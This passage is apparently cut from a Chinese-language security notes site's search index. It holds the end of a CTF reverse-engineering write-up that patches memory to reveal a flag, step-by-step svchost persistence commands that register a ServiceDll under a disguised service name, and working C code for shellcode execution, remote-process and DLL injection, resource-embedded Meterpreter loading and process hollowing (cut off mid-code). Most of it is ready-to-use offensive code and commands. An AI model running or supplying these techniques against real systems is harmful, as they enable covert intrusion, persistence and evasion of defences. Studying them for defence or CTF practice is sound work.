.text:004017AD imul eax, [ebp+var_64] .text:004017B1 mov dword ptr [esp+0Ch], offset unk_490000 .text:004017B9 mov dword ptr [esp+8], 10h .text:004017C1 mov dword ptr [esp+4], offset __ZL9vsnprintfPcjPKcS_ ; char * .text:004017C9 mov [esp+10h], eax .text:004017CD lea eax, [ebp+var_1C] .text:004017D0 mov [esp], eax .text:004017D3 mov [ebp+fctx.call_site], 2 .text:004017DA call __ZN9__gnu_cxx12__to_xstringISscEET_PFiPT0_jPKS2_PcEjS5_z ; __gnu_cxx::__to_xstring<std::string,char>(int (*)(char *,uint,char const*,char *),uint,char const*,...) .text:004017DF lea ecx, [ebp+var_1C] .text:004017E2 mov dword ptr [esp], offset unk_490003 ; this .text:004017E9 mov [ebp+fctx.call_site], 3 .text:004017F0 call __ZNSs6appendEPKc ; std::string::append(char const*) .text:004017F5 push ecx .text:004017F6 lea ecx, [ebp+var_18] .text:004017F9 mov [esp], eax .text:004017FC call __ZNSsC1EOSs ; std::string::string(std::string &&) .text:00401801 lea eax, [ebp+var_18] .text:00401804 push edx .text:00401805 mov [esp], eax .text:00401808 mov ecx, [ebp+arg_0] .text:0040180B mov [ebp+fctx.call_site], 4 .text:00401812 call __ZNSspLERKSs ; std::string::operator+=(std::string const&) .text:00401817 lea ecx, [ebp+var_18] .text:0040181A push eax ; this .text:0040181B call __ZNSsD1Ev ; std::string::~string() .text:00401820 lea ecx, [ebp+var_1C] .text:00401823 call __ZNSsD1Ev ; std::string::~string() .text:00401828 lea ecx, [ebp+var_14] .text:0040182B call __ZNSt6vectorISsSaISsEED4Ev_isra_49 ; std::vector<std::string,std::allocator<std::string>>::~vector() [clone] .text:00401830 inc [ebp+lpuexcpt] .text:00401833 jmp loc_401775 .text:00401838 ; --------------------------------------------------------------------------- .text:00401838 .text:00401838 loc_401838: ; DATA XREF: encode+1A\u2191o .text:00401838 ; cleanup() // owned by 401753 .text:00401838 add ebp, 8 .text:0040183B mov eax, [ebp+fctx.data] .text:0040183E mov [ebp+lpuexcpt], eax .text:00401841 mov eax, [ebp+fctx.call_site] .text:00401844 test eax, eax .text:00401846 jz short loc_401871 .text:00401848 dec eax .text:00401849 jnz short loc_401855 .text:0040184B .text:0040184B loc_40184B: ; CODE XREF: encode+13F\u2193j .text:0040184B lea ecx, [ebp+var_14] .text:0040184E call __ZNSt6vectorISsSaISsEED4Ev_isra_49 ; std::vector<std::string,std::allocator<std::string>>::~vector() [clone] .text:00401853 jmp short loc_401871 .text:00401855 ; --------------------------------------------------------------------------- .text:00401855 .text:00401855 loc_401855: ; CODE XREF: encode+128\u2191j .text:00401855 dec eax .text:00401856 jnz short loc_401862 .text:00401858 .text:00401858 loc_401858: ; CODE XREF: encode+14C\u2193j .text:00401858 lea ecx, [ebp+var_1C] .text:0040185B call __ZNSsD1Ev ; std::string::~string() .text:00401860 jmp short loc_40184B .text:00401862 ; --------------------------------------------------------------------------- .text:00401862 .text:00401862 loc_401862: ; CODE XREF: encode+135\u2191j .text:00401862 dec eax .text:00401863 jnz short loc_40186F .text:00401865 lea ecx, [ebp+var_18] .text:00401868 call __ZNSsD1Ev ; std::string::~string() .text:0040186D jmp short loc_401858 .text:0040186F ; --------------------------------------------------------------------------- .text:0040186F .text:0040186F loc_40186F: ; CODE XREF: encode+142\u2191j .text:0040186F ud2 .text:00401871 ; --------------------------------------------------------------------------- .text:00401871 .text:00401871 loc_401871: ; CODE XREF: encode+125\u2191j .text:00401871 ; encode+132\u2191j .text:00401871 mov ecx, [ebp+arg_0] .text:00401874 call __ZNSsD1Ev ; std::string::~string() .text:00401879 mov eax, [ebp+lpuexcpt] .text:0040187C mov [esp], eax ; lpuexcpt .text:0040187F mov [ebp+fctx.call_site], 0FFFFFFFFh .text:00401886 call __Unwind_SjLj_Resume .text:0040188B ; --------------------------------------------------------------------------- .text:0040188B .text:0040188B loc_40188B: ; CODE XREF: encode+5A\u2191j .text:0040188B lea eax, [ebp+fctx] .text:0040188E mov [esp], eax ; lpfctx .text:00401891 call __Unwind_SjLj_Unregister .text:00401896 mov eax, [ebp+arg_0] .text:00401899 leave .text:0040189A retn .text:0040189A ; } // starts at 401753 .text:0040189A ; } // starts at 401753 .text:0040189A encode endp \u7ee7\u7eed\u8c03\u8bd5\u53ef\u77e5\u9053\u89e3\u5bc6\u51fd\u6570 text:0040189B push ebp .text:0040189C mov ebp, esp .text:0040189E push ebx .text:0040189F lea eax, [ebp+var_8] .text:004018A2 sub esp, 74h .text:004018A5 mov [ebp+fctx.personality], offset ___gxx_personality_sj0 .text:004018AC mov [ebp+fctx.lsda], offset word_4868BE .text:004018B3 mov [ebp+fctx.jbuf], eax .text:004018B6 lea eax, [ebp+fctx] .text:004018B9 mov [ebp+var_24], esp .text:004018BC mov [ebp+var_28], offset loc_4019E7 .text:004018C3 mov [esp], eax ; lpfctx .text:004018C6 call __Unwind_SjLj_Register .text:004018CB ; __unwind { // ___gxx_personality_sj0 .text:004018CB ; try { .text:004018CB lea eax, [ebp+var_C] .text:004018CE mov dword ptr [esp], offset byte_490005 ; char * .text:004018D5 mov [esp+4], eax ; int .text:004018D9 mov ecx, [ebp+arg_0] .text:004018DC mov [ebp+fctx.call_site], 0FFFFFFFFh .text:004018E3 call __ZNSsC1EPKcRKSaIcE ; std::string::string(char const*,std::allocator<char> const&) .text:004018E8 push edx .text:004018E9 push edx ; this .text:004018EA mov eax, [ebp+arg_4] .text:004018ED mov eax, [eax+4] .text:004018F0 mov [ebp+lpuexcpt], eax .text:004018F3 lea eax, [ebp+var_C] .text:004018F6 mov [ebp+EndPtr], eax .text:004018F9 .text:004018F9 loc_4018F9: ; CODE XREF: decode+112\u2193j .text:004018F9 mov eax, [ebp+arg_4] .text:004018FC mov ebx, [ebp+lpuexcpt] .text:004018FF cmp ebx, [eax] .text:00401901 jz loc_4019B2 .text:00401907 sub [ebp+lpuexcpt], 4 .text:0040190B mov eax, [ebp+lpuexcpt] .text:0040190E mov eax, [eax] .text:00401910 mov [ebp+fctx.call_site], 1 .text:00401917 mov [ebp+String], eax .text:0040191A call ds:__imp___errno .text:00401920 mov dword ptr [eax], 0 .text:00401926 mov dword ptr [esp+8], 0Ah ; Radix .text:0040192E mov eax, [ebp+EndPtr] .text:00401931 mov [esp+4], eax ; EndPtr .text:00401935 mov eax, [ebp+String] .text:00401938 mov [esp], eax ; String .text:0040193B call _strtol .text:00401940 mov [ebp+var_58], eax .text:00401943 mov eax, [ebp+String] .text:00401946 cmp [ebp+var_C], eax .text:00401949 jnz short loc_401957 .text:0040194B mov dword ptr [esp], offset aStoi ; \"stoi\" .text:00401952 call __ZSt24__throw_invalid_argumentPKc ; std::__throw_invalid_argument(char const*) .text:00401957 ; --------------------------------------------------------------------------- .text:00401957 .text:00401957 loc_401957: ; CODE XREF: decode+AE\u2191j .text:00401957 mov [ebp+fctx.call_site], 1 .text:0040195E call ds:__imp___errno .text:00401964 cmp dword ptr [eax], 22h ; '\"' .text:00401967 jz loc_401A0A .text:0040196D mov eax, [ebp+arg_4] .text:00401970 mov edx, [eax+4] .text:00401973 mov eax, [eax] .text:00401975 mov byte ptr [esp+0Ch], 0 .text:0040197A mov ebx, [ebp+lpuexcpt] .text:0040197D mov [esp+4], edx ; char .text:00401981 mov [esp], eax .text:00401984 mov [esp+8], ebx .text:00401988 call __ZSt9__find_ifIN9__gnu_cxx17__normal_iteratorIPKSsSt6vectorISsSaISsEEEENS0_5__ops16_Iter_equals_valIS2_EEET_SB_SB_T0_St26random_access_iterator_tag ; std::__find_if<__gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string,std::allocator<std::string>>>,__gnu_cxx::__ops::_Iter_equals_val<std::string const>>(__gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string,std::allocator<std::string>>>,__gnu_cxx::__normal_iterator<std::string const*,std::vector<std::string,std::allocator<std::string>>>,__gnu_cxx::__ops::_Iter_equals_val<std::string const>,std::random_access_iterator_tag) .text:0040198D mov ebx, [ebp+arg_4] .text:00401990 sub eax, [ebx] .text:00401992 sar eax, 2 .text:00401995 lea ecx, [eax+1] .text:00401998 mov eax, [ebp+var_58] .text:0040199B cdq .text:0040199C idiv ecx .text:0040199E movsx eax, al .text:004019A1 mov [esp], eax ; this .text:004019A4 mov ecx, [ebp+arg_0] .text:004019A7 call __ZNSs9push_backEc ; std::string::push_back(char) .text:004019AC push eax .text:004019AD jmp loc_4018F9 .text:004019B2 ; --------------------------------------------------------------------------- .text:004019B2 .text:004019B2 loc_4019B2: ; CODE XREF: decode+66\u2191j .text:004019B2 mov ecx, [ebp+arg_0] .text:004019B5 mov [ebp+fctx.call_site], 1 .text:004019BC call __ZNSs3endEv ; std::string::end(void) .text:004019C1 mov ecx, [ebp+arg_0] .text:004019C4 mov [ebp+lpuexcpt], eax .text:004019C7 call __ZNSs5beginEv ; std::string::begin(void) .text:004019CC mov edx, [ebp+lpuexcpt] .text:004019CF dec edx .text:004019D0 cmp eax, [ebp+lpuexcpt] .text:004019D3 jz short loc_401A1D .text:004019D5 .text:004019D5 loc_4019D5: ; CODE XREF: decode+14A\u2193j .text:004019D5 cmp eax, edx .text:004019D7 jnb short loc_401A1D .text:004019D9 mov cl, [eax] .text:004019DB mov bl, [edx] .text:004019DD inc eax .text:004019DE dec edx .text:004019DF mov [eax-1], bl .text:004019E2 mov [edx+1], cl .text:004019E5 jmp short loc_4019D5 .text:004019E7 ; --------------------------------------------------------------------------- .text:004019E7 .text:004019E7 loc_4019E7: ; DATA XREF: decode+21\u2191o .text:004019E7 ; cleanup() // owned by 4018CB .text:004019E7 add ebp, 8 .text:004019EA mov eax, [ebp+fctx.data] .text:004019ED mov ecx, [ebp+arg_0] .text:004019F0 mov [ebp+lpuexcpt], eax .text:004019F3 call __ZNSsD1Ev ; std::string::~string() .text:004019F8 mov eax, [ebp+lpuexcpt] .text:004019FB mov [esp], eax ; lpuexcpt .text:004019FE mov [ebp+fctx.call_site], 0FFFFFFFFh .text:00401A05 call __Unwind_SjLj_Resume .text:00401A0A ; --------------------------------------------------------------------------- .text:00401A0A .text:00401A0A loc_401A0A: ; CODE XREF: decode+CC\u2191j .text:00401A0A mov dword ptr [esp], offset aStoi ; \"stoi\" .text:00401A11 mov [ebp+fctx.call_site], 1 .text:00401A18 call __ZSt20__throw_out_of_rangePKc ; std::__throw_out_of_range(char const*) .text:00401A1D ; --------------------------------------------------------------------------- .text:00401A1D .text:00401A1D loc_401A1D: ; CODE XREF: decode+138\u2191j .text:00401A1D ; decode+13C\u2191j .text:00401A1D lea eax, [ebp+fctx] .text:00401A20 mov [esp], eax ; lpfctx .text:00401A23 call __Unwind_SjLj_Unregister .text:00401A28 mov eax, [ebp+arg_0] .text:00401A2B mov ebx, [ebp+var_4] .text:00401A2E leave .text:00401A2F retn .text:00401A2F ; } // starts at 4018CB .text:00401A2F ; } // starts at 4018CB .text:00401A2F decode endp \u6765\u5c1d\u8bd5\u4e00\u4e9bbypass\u7684\u529e\u6cd5\uff0c\u800c\u4e0d\u76f4\u63a5\u9762\u5bf9\u52a0\u5bc6\u7b97\u6cd5 \u627e\u5230\u8c03\u7528\u52a0\u5bc6\u5b57\u7b26\u4e32\u7684\u5730\u65b9\u4e0b\u65ad\u70b9 \u5c1d\u8bd5\u5c060x49A024\u4fee\u6539\u4e3a0x49A028\uff0c\u770b\u5230\u7a0b\u5e8f\u8fd4\u56de\u63d0\u793a\u53d8\u6210\u4e86\u6b63\u786e\u7684\u63d0\u793a \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u5730\u5740\u662f\u6808\u4e0a\u7684\u5f15\u7528\u5730\u5740\uff0c\u539f\u59cb\u5b57\u7b26\u4e32\u5b58\u50a8\u4f4d\u7f6e\u4e0d\u662f\u8fd9\u4e2a\u5730\u5740 0x49A02C \u672a\u77e5\u5b57\u7b26\u4e32 &\"49 98 162 128 250 288 392 256 450 570 539 384 676 756 780 512 901 882 912 640 1134 1144 1288 768 1350 1430 1539 896 1624 1500 1612 1024 1881 1768 1855 1152 1813 1862 2067 1920 1312 2058 2150 2376 2385 1472 2303 2496 2352 2600 1632 2548 2756 3078 2915 1792 3135 2842 3068\" 0x49A028 \u6210\u529f\u63d0\u793a\u7684\u5b57\u7b26\u4e32 congratulations! you did it successfully! &\"99 222 330 412 570 582 812 936 972 970 1276 1260 1443 1540 1725 528 544 2178 2109 2340 672 2200 2415 2400 800 2730 3132 896 3335 3510 3069 3168 3333 3910 4025 3672 4329 4104 4212 4840 1353\" 0x49A024 \u5931\u8d25\u63d0\u793a\u7684\u5b57\u7b26\u4e32 You made a mistake. Try again!! &\"89 222 351 128 545 582 700 808 288 970 352 1308 1365 1610 1740 1552 1819 1818 874 640 1764 2508 2783 768 2425 2678 2619 2940 3190 990 1023\" 0x49A020 pause\u5b57\u7b26\u4e32 &\"112 194 351 460 505\" \u6211\u60f3\u77e5\u90530x49A02C\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\uff0c\u5f53\u66ff\u6362\u4e3a0x49A02C\u65f6\uff0c\u8f93\u51fa\u7684\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f3c\u4e4e\u8fd8\u6709\u4e00\u5c42\u52a0\u5bc6 116 208 291 464 510 648 679 824 945 1150 1265 1404 1495 714 \u5b9a\u4f4d\u5230\u5b58\u50a8\u6570\u636e\u7684\u539f\u59cb\u5730\u5740\u3002 \u540c\u6837\u641c\u7d22\u5b57\u7b26\u4e32\u53ef\u4ee5\u770b\u5230\uff0c\u6ca1\u6709&\u7684\u8868\u793a\u539f\u59cb\u6570\u636e\uff0c\u8ddf\u8e2a\u5230\u5185\u5b58\u5c31\u53ef\u4ee5\u627e\u5230\u539f\u59cb\u5730\u5740 \u5c06\u8fd9\u6bb5\u6570\u636e\u66ff\u6362\u9519\u8bef\u63d0\u793a\u7684\u6570\u636e\u3002 \u5728\u7a0b\u5e8f\u5165\u53e3\u65ad\u70b9\u65f6\u4fee\u6539\u5185\u5b58\u6570\u636e\uff0c\u518d\u8fd0\u884c\u3002 \u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5b57\u7b26\u4e32\u4e8c\u6b21\u89e3\u5bc6\u4e3a\u4e86 thatflagissus3 \u8fd9\u5c31\u662f\u5bc6\u7801","title":"Dojas's find the encryptor"},{"location":"Windows%E7%9B%B8%E5%85%B3/svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/","text":"\u67e5\u8be2\u7248\u672c\uff0c1703\u4ee5\u4e0a\u4e0d\u53ef\u7528 reg query HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ReleaseId \u7b2c\u4e00\u6b65 \u6dfb\u52a0\u6ce8\u518c\u8868\uff08\u7528bof\uff09 reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\RPCTerm\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\\ProgramData\\Microsoft\\UserData.dll /f \u7b2c\u4e8c\u6b65 \u6dfb\u52a0\u6ce8\u518c\u8868\uff08\u7528bof\uff09 \u9009\u4e00\u4e2a\u5b58\u5728\u7684\u670d\u52a1\u7ec4\u540d\uff0c\u5c06\u521b\u5efa\u7684\u670d\u52a1\u6dfb\u52a0\u5230\u7ec4 \u67e5\u8be2\u670d\u52a1\u7ec4 reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /se @ \u9009\u4e00\u4e2a\u670d\u52a1\u591a\u7684\u7ec4\uff0c\u5f80\u7ec4\u91cc\u6dfb\u52a0\u4e00\u4e2aREG_MULTI_SZ\u7684\u503c\u3002\u9700\u8981\u5148\u67e5\u8be2\u51fa\u539f\u672c\u7684\u503c\uff0c\u518d\u91cd\u65b0\u5199\u5165 win7 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Svchost /v DcomLaunch /t REG_MULTI_SZ /d \"Power\\0PlugPlay\\0DcomLaunch\\0RPCTerm\\0\" /f \u7b2c\u4e09\u6b65 \u521b\u5efa\u670d\u52a1\uff08\u7528bof\u6682\u65f6bug\uff09,\u6307\u5b9a\u6dfb\u52a0\u7684\u7ec4\uff0c\u6dfb\u52a0\u670d\u52a1\u63cf\u8ff0\uff0c\u6df7\u6dc6\u670d\u52a1\u540d sc.exe create RPCTerm binPath= \"c:\\windows\\System32\\svchost.exe -k DcomLaunch\" DisplayName= \"Remote Desktop Termle Services\" type= share start= auto \u6e05\u9664 reg delete HKLM\\SYSTEM\\CurrentControlSet\\services\\RPCTerm /f","title":"svchost\u6743\u9650\u7ef4\u6301\uff08WIN10 1703\u4e4b\u540e\u65e0\u6548\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/#1703","text":"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ReleaseId","title":"\u67e5\u8be2\u7248\u672c\uff0c1703\u4ee5\u4e0a\u4e0d\u53ef\u7528"},{"location":"Windows%E7%9B%B8%E5%85%B3/svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/#_1","text":"\u6dfb\u52a0\u6ce8\u518c\u8868\uff08\u7528bof\uff09 reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\RPCTerm\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\\ProgramData\\Microsoft\\UserData.dll /f","title":"\u7b2c\u4e00\u6b65"},{"location":"Windows%E7%9B%B8%E5%85%B3/svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/#_2","text":"\u6dfb\u52a0\u6ce8\u518c\u8868\uff08\u7528bof\uff09 \u9009\u4e00\u4e2a\u5b58\u5728\u7684\u670d\u52a1\u7ec4\u540d\uff0c\u5c06\u521b\u5efa\u7684\u670d\u52a1\u6dfb\u52a0\u5230\u7ec4 \u67e5\u8be2\u670d\u52a1\u7ec4 reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /se @ \u9009\u4e00\u4e2a\u670d\u52a1\u591a\u7684\u7ec4\uff0c\u5f80\u7ec4\u91cc\u6dfb\u52a0\u4e00\u4e2aREG_MULTI_SZ\u7684\u503c\u3002\u9700\u8981\u5148\u67e5\u8be2\u51fa\u539f\u672c\u7684\u503c\uff0c\u518d\u91cd\u65b0\u5199\u5165 win7 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Svchost /v DcomLaunch /t REG_MULTI_SZ /d \"Power\\0PlugPlay\\0DcomLaunch\\0RPCTerm\\0\" /f","title":"\u7b2c\u4e8c\u6b65"},{"location":"Windows%E7%9B%B8%E5%85%B3/svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/#_3","text":"\u521b\u5efa\u670d\u52a1\uff08\u7528bof\u6682\u65f6bug\uff09,\u6307\u5b9a\u6dfb\u52a0\u7684\u7ec4\uff0c\u6dfb\u52a0\u670d\u52a1\u63cf\u8ff0\uff0c\u6df7\u6dc6\u670d\u52a1\u540d sc.exe create RPCTerm binPath= \"c:\\windows\\System32\\svchost.exe -k DcomLaunch\" DisplayName= \"Remote Desktop Termle Services\" type= share start= auto","title":"\u7b2c\u4e09\u6b65"},{"location":"Windows%E7%9B%B8%E5%85%B3/svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/#_4","text":"reg delete HKLM\\SYSTEM\\CurrentControlSet\\services\\RPCTerm /f","title":"\u6e05\u9664"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","text":"\u4ee3\u7801\u6ce8\u5165\u5b66\u4e60 \u672c\u5730\u8fdb\u7a0b\u6ce8\u5165 \u8981\u6267\u884cshellcode\u9700\u8981\u6709\u4e00\u4e2aRWX\u5185\u5b58\u5757\u3002 \u5728\u672c\u4f8b\u4ee3\u7801\u4e2d VirtualAlloc\u51fd\u6570\u5206\u914d\u865a\u62df\u5185\u5b58 {\u5730\u5740, \u5927\u5c0f, \u5185\u5b58\u7c7b\u578b, \u5185\u5b58\u4fdd\u62a4} LPVOID VirtualAlloc( [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect ); sizeof \u8fd0\u7b97\u7b26\u8ba1\u7b97shellcode\u957f\u5ea6 sizeof unary-expression sizeof ( type-name ) memcpy \u4ece\u7f13\u51b2\u533a\u590d\u5236\u5b57\u8282 #include \"Windows.h\" int main() { unsigned char shellcode[] = \"\\x48\\x31\"; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; } \u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165 \u672c\u5730\u8fdb\u7a0b\u6ce8\u5165\u542f\u52a8\u7684\u5f53\u524d\u8fdb\u7a0b\uff0c\u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165\u662f\u53ef\u4ee5\u5c06\u4ee3\u7801\u6ce8\u5165\u5230\u5176\u4ed6\u8fdb\u7a0b OpenProcess \u83b7\u53d6\u8fdb\u7a0b\u7684\u53e5\u67c4 VirtualAllocEx \u5728\u6307\u5b9a\u8fdb\u7a0b\u865a\u62df\u7a7a\u95f4\u7533\u8bf7\u865a\u62df\u5185\u5b58 WriteProcessMemory \u5f80\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5199\u5165shellcode CreateRemoteThread \u5728\u8fdc\u7a0b\u8fdb\u7a0b\u4e0a\u521b\u5efa\u7ebf\u7a0b #include \"Windows.h\" int main(int argc, char *argv[]) { unsigned char shellcode[] = \"\\x48\"; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; printf(\"Injecting to PID: %i\", atoi(argv[1])); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; } DLL\u6ce8\u5165 \u5c06dll\u6ce8\u5165\u5230\u8fdc\u7a0b\u8fdb\u7a0b\uff0c\u6d41\u7a0b\u548c\u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165\u5dee\u4e0d\u591a int main(int argc, char *argv[]) { HANDLE processHandle; PVOID remoteBuffer; wchar_t dllPath[] = TEXT(\"C:\\\\experiments\\\\evilm64.dll\"); printf(\"Injecting DLL to PID: %i\\n\", atoi(argv[1])); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL); PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\"); CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL); CloseHandle(processHandle); return 0; } process doppelganging \uff08\u8fdb\u7a0b\u5206\u8eab\uff09 https://github.com/hasherezade/process_doppelganging \u4ece\u8d44\u6e90\u8868\u8f7d\u5165shellcode #pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\") #include <iostream> #include <Windows.h> #include \"resource.h\" int main() { // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L\"payload_bin\"); DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource); HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource); void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcodeResouceData, shellcodeSize); ((void(*)())exec)(); return 0; } \u5bfc\u5165\u81ea\u5b9a\u4e49\u8d44\u6e90 \u7c7b\u578b\u540d\u79f0\u8981\u5bf9\u5e94 \u53ef\u770b\u5230shellcode\u88ab\u5b58\u50a8\u5230\u4e86\u8d44\u6e90\u8868\u4e2d ![[../images/20230706154501.png]] Process Hollowing \uff08\u8fdb\u7a0b\u6316\u7a7a\uff09 \u4ee3\u7801\u6ca1\u6d4b\u8bd5\u6210\u529f\uff0c\u5148\u653e\u7740 \u672c\u4f8b\u4ee3\u7801\u4e2d CreateProcessA\u51fd\u6570 \u521b\u5efa\u8fdb\u7a0b BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, \u6267\u884c\u7684\u7a0b\u5e8f\u540d\u79f0 [in, out, optional] LPSTR lpCommandLine, \u6267\u884c\u7684\u547d\u4ee4 [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, \u4e00\u822cNULL [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, \u4e00\u822cNULL [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, \u8fdb\u7a0b\u6807\u5fd7 [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, STARTUPINFOA\u7ed3\u6784\u4f53\uff0c\u6307\u5b9a\u521b\u5efa\u65f6\u8fdb\u7a0b\u7684\u4e3b\u7a97\u53e3\u7684\u7a97\u53e3\u5de5\u4f5c\u7ad9\u3001\u684c\u9762\u3001\u6807\u51c6\u53e5\u67c4\u548c\u5916\u89c2\u3002 [out] LPPROCESS_INFORMATION lpProcessInformation PROCESS_INFORMATION\u7ed3\u6784\u4f53,\u53e5\u67c4\u53ca\u7ebf\u7a0b\u4fe1\u606f ); NtQueryInformationProcess\u51fd\u6570 \u68c0\u7d22\u6709\u5173\u6307\u5b9a\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002 // process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there. // #include <iostream> #include <Windows.h> #include <winternl.h> using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID); typedef struct BASE_RELOCATION_BLOCK { DWORD PageAddress; DWORD BlockSize; } BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK; typedef struct BASE_RELOCATION_ENTRY { USHORT Offset : 12; USHORT Type : 4; } BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY; int main() { // create destination process - this is the process to be hollowed out LPSTARTUPINFOA si = new STARTUPINFOA(); LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION(); PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION(); DWORD returnLenght = 0; CreateProcessA(NULL, (LPSTR)\"c:\\\\windows\\\\syswow64\\\\notepad.exe\", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi); HANDLE destProcess = pi->hProcess; // get destination imageBase offset address from the PEB NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght); DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8; // get destination imageBaseAddress LPVOID destImageBase = 0; SIZE_T bytesRead = NULL; ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead); // read source file - this is the file that will be executed inside the hollowed process HANDLE sourceFile = CreateFileA(\"c:\\\\windows\\\\syswow64\\\\notepad.exe\", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL); DWORD sourceFileSize = GetFileSize(sourceFile, NULL); LPDWORD fileBytesRead = 0; LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize); ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL); // get source image size PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer; PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew); SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage; // carve out the destination image NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtUnmapViewOfSection\")); myNtUnmapViewOfSection(destProcess, destImageBase); // allocate new memory in destination image for the source image LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); destImageBase = newDestImageBase; // get delta between sourceImageBaseAddress and 